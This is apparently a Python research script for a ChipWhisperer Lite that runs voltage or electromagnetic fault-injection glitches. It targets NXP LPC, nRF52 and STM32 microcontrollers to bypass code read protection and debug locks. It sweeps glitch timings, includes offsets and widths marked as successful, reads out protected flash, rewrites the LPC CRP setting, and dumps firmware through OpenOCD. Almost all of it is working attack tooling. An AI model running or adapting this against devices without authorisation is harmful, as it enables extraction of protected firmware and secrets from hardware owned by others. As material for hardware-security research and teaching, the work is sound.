# LPC Resources
# https://github.com/newaetech/chipwhisperer-jupyter/blob/dcfcba460210f1b948a646ba97ebd32d253cce69/courses/faultapp1/LPC1114_Fuse_Bypass.ipynb
# https://forum.newae.com/t/lpc1343-weird-bounces-on-my-glitch/2821
# https://ibb.co/6w6T9hL
# https://hardwear.io/netherlands-2022/presentation/bypass-NXP-LPC-family-debug-check.pdf
# https://recon.cx/2017/brussels/resources/slides/RECON-BRX-2017-Breaking_CRP_on_NXP_LPC_Microcontrollers_slides.pdf
# https://www.youtube.com/watch?v=98eqp4WmHoQ
# https://toothless.co/blog/bootloader-bypass-part1


import chipwhisperer as cw
import time
import serial
import os
import argparse
from collections import namedtuple
import lpc1343 as lpc1343
import external.nxpprog as nxpprog

SCOPETYPE = 'OPENADC'
PLATFORM = 'NOTHING'

def target_reset(_scope):
    _scope.io.nrst = 'low'
    time.sleep(0.05)
    _scope.io.nrst = 'high_z'
    time.sleep(0.05)

def vglitch_reset(_scope, _delay=0.005):
    # Reset the glitching module.
    """
    """
    hp = _scope.io.glitch_hp
    lp = _scope.io.glitch_lp
    _scope.io.glitch_hp = False
    _scope.io.glitch_lp = False
    time.sleep(_delay)
    _scope.io.glitch_hp = hp
    _scope.io.glitch_lp = lp

## Function to reboot the Target MCU
def reboot_flush(_scope, _reset_option):
    # global scope
    if _reset_option == 'vdd':
        _scope.io.target_pwr = False # Switch off the device
        # Wait for the AirTag to finish powering off (it has a lot of capacitance)
        # Wait for the capacitors to be discharged
        # Delay Before Powering up the Target
        # time.sleep(0.7) # There is a lot of capacitance on the AirTag, so we have to wait a bit for the powering off.
        time.sleep(0.1)
        _scope.arm()
        _scope.io.target_pwr = True # Switch on the device
    elif _reset_option == 'rst':
        _scope.io.nrst = 'low'
        time.sleep(0.1)
        _scope.arm()
        _scope.io.nrst = 'high_z'

# python cwLite_DAP_CX.py -i cwLite -d lpc1434 -r rst -a vfi
def parse_arguments():
    """Parse command-line arguments."""
    # Create argument parser
    parser = argparse.ArgumentParser(description="Script with input parameters -i, -d, and an optional -a")
    parser.add_argument("-i", choices=['jlink', 'stlink', 'cwLite'], help="Choose between 'link', 'stlink' and 'cwLite'", required=True)
    parser.add_argument("-d", choices=['nrf52840', 'nrf52833', 'stm32', 'lpc1434'], help="Choose between 'nrf52840', 'nrf52833', 'stm32' and 'NXP lpc1434'", required=True)
    parser.add_argument("-r", choices=['vdd', 'rst'], help="Choose between 'VDD: Control Target's VDD Line' and 'RST: Control Target's RESET pin' - Default is 'vdd'")
    parser.add_argument("-a", choices=['vfi', 'emfi'], help="Choose between 'Voltage Fault Injection Glitch' and 'ElectroMagnetic Fault Injection Glitch' - Default is 'vfi'")
    # Parse the arguments & return
    return parser.parse_args()

def main():
    # Pare input arguments & Prepare required links
    args = parse_arguments()

    # Access the arguments
    interface_option = args.i
    device_option = args.d
    reset_option = args.r
    attack_option = args.a

    # Check if both options are provided
    if interface_option is None or device_option is None:
        print("Both -i and -d parameters are required.")
        return

    # Print chosen options
    print("Chosen interface option:", interface_option)
    print("Chosen target option:", device_option)
    if reset_option:
        print("Chosen reset type:", reset_option)
    else:
        reset_option = 'vdd'
        print("Default reset type:", reset_option)
    if attack_option:
        print("Chosen attack type:", attack_option)
    else:
        attack_option = 'vfi'
        print("Default attack type:", attack_option)

    #########################################################
    # Start of ChipWhisperer Lite Script

    # disable logging
    cw.set_all_log_levels(cw.logging.CRITICAL)

    # ------------------------------
    # Initiate Connection to the Chipwhisperer Lite Kit
    print("Connecting to CW_Lite.")
    scope = cw.scope()
    try:
        if not scope.connectStatus:
            scope.con()
    except NameError:
        scope = cw.scope()
    print("INFO: Found ChipWhisperer😍")
    time.sleep(0.05)
    # scope.default_setup()

    # Initializing the cwLite configurations
    if device_option == 'lpc1434':
        target = cw.target(scope)
        # Original attack done with 100 MHz clock - can be helpful to run this
        # 2x faster to get better resolution, which seems useful for glitching certain boards.
        # But if you want to use DPA you need to leave this set to '1'
        freq_multiplier = 1

        #Initial Setup
        scope.adc.samples = 10000
        scope.adc.offset = 0
        scope.clock.adc_src = "clkgen_x1"
        scope.trigger.triggers = "tio4"
        scope.io.glitch_lp = True
        scope.io.hs2 = None

        # this value is for CW-Lite/Pro; for CW-Husky, refer to Fault 1_1
        scope.glitch.width = 40
        scope.io.tio1 = "serial_rx"
        scope.io.tio2 = "serial_tx"
        scope.adc.basic_mode = "rising_edge"
        scope.clock.clkgen_freq = 100000000 * freq_multiplier
        scope.glitch.clk_src = "clkgen"
        scope.glitch.trigger_src = "ext_single"
        scope.glitch.output = "enable_only"

        # target.baud = 38400
        # target.key_cmd = ""
        # target.go_cmd = ""
        # target.output_cmd = ""
    else:
        scope.clock.clkgen_freq = 100E6
        scope.glitch.clk_src="clkgen"
        scope.glitch.output = "enable_only"
        scope.glitch.trigger_src = "ext_single"
        if reset_option == 'vdd':
            scope.trigger.triggers = "tio4"
            scope.adc.basic_mode = 'rising_edge'
            print('scope.adc.basic_mode: ' + scope.adc.basic_mode)
        elif reset_option == 'rst':
            scope.io.target_pwr = True
            scope.trigger.triggers = 'nrst' #"nrst"
            scope.adc.basic_mode = 'rising_edge'

        # scope.glitch.arm_timing = "before_scope" ### ????
        scope.io.glitch_lp = True
        scope.io.glitch_hp = True
        # scope.adc.samples = 1 ### ???

    # Initializing cwLite Glitch attack parameters' settings
    if device_option == 'lpc1434':

        Range = namedtuple("Range", ["min", "max", "step"])
        # offset_range = Range(5180*freq_multiplier, 5185*freq_multiplier, 1)
        # repeat_range = Range(7*freq_multiplier, 40*freq_multiplier, 1)

        # offset_range = Range(5162*freq_multiplier, 5170*freq_multiplier, 1)
        #####offset_range = Range(5160*freq_multiplier, 5190*freq_multiplier, 1)

        # offset_range = Range(2000*freq_multiplier, 7000*freq_multiplier, 1)   # Aggressive Test
        # Working Values: Glitch offset 4897, width 101........[SUCCESS]
        offset_range = Range(4890*freq_multiplier, 4900*freq_multiplier, 1)

        # repeat_range = Range(7*freq_multiplier, 100*freq_multiplier, 1)
        repeat_range = Range(100, 300, 1)

        scope.glitch.width = 40
        scope.glitch.repeat = repeat_range.min
    else:

        # gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset"])
        gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["ext_offset", "repeat"])
        gc.set_global_step(1)
        # gc.set_range("repeat", 5, 20)              # Length of the glitch pulse
        # gc.set_range("repeat", 1, 50)              # Length of the glitch pulse
        # gc.set_range("ext_offset", 102500, 104500)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_step("ext_offset", 100)
        # gc.set_step("ext_offset", 10)
        # gc.set_range("ext_offset", 103000, 104500)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_range("ext_offset", 103500, 104500)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_range("ext_offset", 104500, 104600)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_range("ext_offset", 105000, 105400)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_range("ext_offset", 106000, 107000)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_range("ext_offset", 116000, 117000)  # Time after trigger to glitch, in CW clock cycles.
        # gc.set_range("repeat", 12, 50)              # Length of the glitch pulse
        # gc.set_step("ext_offset", 10)
        # gc.set_step("ext_offset", 1)

        # gc.set_range("ext_offset", 103000, 107000)  # Time after trigger to glitch, in CW clock cycles.
        gc.set_range("ext_offset", 110000, 130000)  # Time after trigger to glitch, in CW clock cycles. # successful for nRF52833
        # gc.set_range("repeat", 100, 8190)              # Length of the glitch pulse
        gc.set_range("repeat", 5000, 8190)              # Length of the glitch pulse    # successful for nRF52833
        # gc.set_range("repeat", 100, 60000)              # Length of the glitch pulse
        gc.set_step("repeat", 50)
        gc.set_step("ext_offset", 50)

        fulllog_fn = 'logs/log-' + time.strftime("%Y%m%d-%H%M%S") + '.txt'

    # Running Glitch Attack

    if device_option == 'lpc1434':
        print("Attempting to glitch LPC Target")

        scope.io.target_pwr = False
        time.sleep(0.2)
        scope.io.target_pwr = True
        time.sleep(0.2)

        nxpdev = lpc1343.CWDevice(scope, target)

        done = False
        while done == False:
            scope.glitch.ext_offset = offset_range.min
            if scope.glitch.repeat >= repeat_range.max:
                scope.glitch.repeat = repeat_range.min
            while scope.glitch.ext_offset < offset_range.max:

                scope.io.nrst = 'low'
                time.sleep(0.05)
                scope.arm()
                scope.io.nrst = 'high'
                target.ser.flush()
                
                print("Glitch offset %4d, width %d........"%(scope.glitch.ext_offset, scope.glitch.repeat), end="")

                time.sleep(0.05)
                try:
                    nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)

                    try:
                        data = nxpp.read_block(0, 4)            
                        print("[SUCCESS]\n")
                        print("  Glitch OK! Reading first 4K...")
                        block = None
                        #Deal with crappy ChipWhisperer serial buffer by splitting read up
                        for i in range(0, 4096, 32):
                            if block is None:
                                block = nxpp.read_block(i, 32)
                            else:
                                block += nxpp.read_block(i, 32)
                        
                        print("  Adjusting CRP...")
                        block = [ord(t) for t in block]
                        lpc1343.set_crp(nxpp, 0, block)
                        done = True
                        break

                    except IOError:
                        print("[NORMAL]")
            
                except IOError:
                    print("[FAILED]")
                    pass
            
                scope.glitch.ext_offset += offset_range.step

            scope.glitch.repeat += repeat_range.step
    else:
        for glitch_setting in gc.glitch_values():
            # Prepare glitch parameters
            # scope.glitch.repeat = glitch_setting[0]
            # scope.glitch.ext_offset = glitch_setting[1]
            scope.glitch.ext_offset = glitch_setting[0]
            scope.glitch.repeat = glitch_setting[1]

            # scope.glitch.ext_offset = 102500
            # scope.glitch.repeat = 2

            # Reboot the Target & arm the scope
            reboot_flush(scope, reset_option)

            time.sleep(0.15)
            timestr = time.strftime("%Y%m%d-%H%M%S")
            # binfilename = 'logs/nrf52_flash' + timestr + '.bin'
            # openocd_str = 'openocd -f ./openocd/nrf52840.cfg -c "init;dump_image ' + binfilename + ' 0x0 0x80000;exit"'
            dumpfilename = 'logs/' + device_option + '_flashDump' + timestr + '.bin'
            openocd_str = 'openocd -f ./openocd/' + device_option + '_' + interface_option + '.cfg -c "init;dump_image ' + dumpfilename + ' 0x0 0x80000;exit"'

            print('dumpfilename: ' + dumpfilename)
            print('openocd_str: ' + openocd_str)
        
            exit_status = os.system(openocd_str)
            fulllog = open(fulllog_fn, 'a')
            fulllog.write(openocd_str + "\n")
            # print(f"repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}")
            print(f"ext_offset: {scope.glitch.ext_offset}, repeat: {scope.glitch.repeat}")
            print("exit_status: " + str(exit_status))
            print("*-----------------------------------*")
            if exit_status == 0:
                print("SUCCESS")
                filename = 'log-' + timestr + '.txt'
                f = open(filename, 'a')
                f.write(f"SUCCESS Paramters: repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}\n")
                f.close()
                fulllog.write(f"SUCCESS Paramters: repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}\n")
                fulllog.close()
                break
            else:
                os.system('rm ' + dumpfilename)
            # Reset the glitching module. Things break if you don't do this.
            time.sleep(0.05)
            vglitch_reset(scope)

if __name__ == "__main__":
    main()